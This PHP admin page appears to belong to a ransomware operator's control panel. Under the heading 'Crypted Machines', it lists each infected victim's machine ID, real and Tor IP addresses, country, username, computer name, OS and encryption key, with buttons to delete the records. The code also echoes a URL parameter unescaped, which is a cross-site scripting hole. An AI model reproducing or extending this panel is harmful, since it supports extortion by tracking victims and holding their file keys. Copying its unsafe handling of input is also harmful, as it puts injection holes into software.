<?php
include("./header.php");
if (isset($_GET['func'])){
    echo $_GET['func'];
    switch ($_GET["func"]){
        case "deleteall":
            $sql = "SELECT `id` FROM `crypted`";
            $all = R::findAll('crypted');
            foreach ($all as $id) {
                $log = R::load('crypted', $id['id']);
                R::trash($log);
            }
            echo '<meta http-equiv="refresh" content="2;url=crypted.php">';
            break;
        case "delete":
            $log = R::load('crypted', $_GET['id']);
            R::trash($log);
            echo '<meta http-equiv="refresh" content="2;url=crypted.php">';
            break;
    }
    //echo $result = "deleted";
}

?>


<!-- Page Content-->
<div class="page-content">
    <div class="container">
        <!-- Page-Title -->
        <div class="row">
            <div class="col-sm-auto">
                <div class="page-title-box">
                    <div class="row">
                        <div class="col">
                            <h4 class="page-title">Crypted Machines</h4>
                        </div>
                        <!--end col-->
                    </div>
                    <!--end row-->
                </div>
                <!--end page-title-box-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->
        <!-- end page title end breadcrumb -->
        <div class="row">
            <div class="col-auto">
                <div class="card">
                    <!--end card-header-->
                    <div class="card-body">
                        <!--
                        <div class="row mb-3">
                            <div class="col-lg-3">
                                <div class="form-group row">
                                    <label for="example-color-input" class="col-sm-3 col-form-label">Name:</label>
                                    <div class="col-sm-9">
                                        <input type="text" class="form-control" id="nameField" required="" placeholder="Name">
                                    </div>
                                </div>
                            </div>

                            <div class="col-lg-4">
                                <div class="form-group row">
                                    <label for="example-color-input" class="col-sm-3 col-form-label">Marker:</label>
                                    <div class="col-sm-9">
                                        <textarea class="form-control" rows="1" id="markerField" placeholder="example.com,example2.com"></textarea>
                                    </div>
                                </div>
                            </div>

                            <div class="col-lg-3">
                                <div class="form-group row">
                                    <label for="example-color-input" class="col-sm-4 col-form-label">Color:</label>
                                    <div class="col-sm-8">
                                        <input class="form-control" type="color" value="#a4b4d5" id="example-color-input">
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 text-right">

                                <button type="submit" class="btn btn-addRules btn-outline-success btn-md">Add rules</button>

                            </div>

                        </div>
-->
                        <a style="position: relative; left: 1010px" href="crypted.php?func=deleteall" class="btn btn-danger">Delete All</a>    
                        <table class="table table-bordered dt-responsive nowrap" style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                            <thead>
                                <tr>
                                    <th style="width: 180px;">ID</th>
                                    <th style="width: 180px;">Machine ID</th>
                                    <th style="width: 100px;" class="text-center">IPAddress</th>
                                    <th style="width: 160px;">Country</th>
                                    <th style="width: 100px;" class="text-center">TorIP</th>
                                    <th style="width: 160px;">Tor Country</th>
                                    <th style="width: 160px;">Username</th>
                                    <th style="width: 160px;">Computer Name</th>
                                    <th style="width: 180px;">Operating System</th>
                                    <th style="width: 160px;">Encryption Key</th>
                                    <th style="width: 200px;">Date Added</th>
                                    <th style="width: 80px;">Action</th>
                                </tr>
                            </thead>


                            <tbody id="rows">
                                <?php
                                    $rows_rules = R::findAll('crypted');
                                    foreach ($rows_rules as $rule){
                                        echo ('<tr id='.$rule["id"].'>'.
                                            '<td>'.$rule["id"].'</td>'.
                                            '<td>'.$rule["machine_id"].'</td>'.
                                            '<td>'.$rule["real_ip"].'</td>'.
                                            '<td>'.$rule["real_country"].'</td>'.
                                            '<td>'.$rule["tor_ip"].'</td>'.
                                            '<td>'.$rule["tor_country"].'</td>'.
                                            '<td>'.$rule["username"].'</td>'.
                                            '<td>'.$rule["compname"].'</td>'.
                                            '<td>'.$rule["os_version"].'</td>'.
                                            '<td>'.$rule["enckey"].'</td>'.
                                            '<td>'.$rule["date_added"].'</td>'.
                                            '<td><a href="crypted.php?func=delete&id='.$rule["id"].'" class="btn btn-danger">Delete</a> </td>'. // </td>'.
                                            //'<td>'.
                                            //    '<div class="custom-control custom-checkbox">'.
                                            //        '<input type="checkbox" class="checkbox_isActive custom-control-input" id="customCheck'.$rule["id"].'" '.$check.' data-parsley-multiple="groups" data-parsley-mincheck="2">'.
                                            //        '<label class="custom-control-label" for="customCheck'.$rule["id"].'"></label>'.
                                            //    '</div>'.
                                            //'</td>'.
                                            '</tr>');
                                        }
                                // require_once 'includes/cryptload.php';
                                // crypterload();
                                ?>
                            </tbody>

                        </table>

                    </div>
                </div>

            </div> <!-- end col -->
        </div> <!-- end row -->

    </div><!-- container -->

    <?php
    include("./footer.php");



    ?>
    <!--end footer-->
</div>
<!-- end page content -->
</div>
<!-- end page-wrapper -->




<!-- jQuery  -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/metismenu.min.js"></script>
<script src="assets/js/waves.js"></script>
<script src="assets/js/feather.min.js"></script>
<script src="assets/js/simplebar.min.js"></script>
<script src="assets/js/moment.js"></script>

<!-- Plugins js -->
<script src="assets/js/select2.min.js"></script>

<script src="assets/js/jquery.forms-advanced.js"></script>

<!-- App js -->
<script src="assets/js/app.js"></script>

<!-- Page js -->
<script src="includes/markeractions.js"></script>

</body>


</html>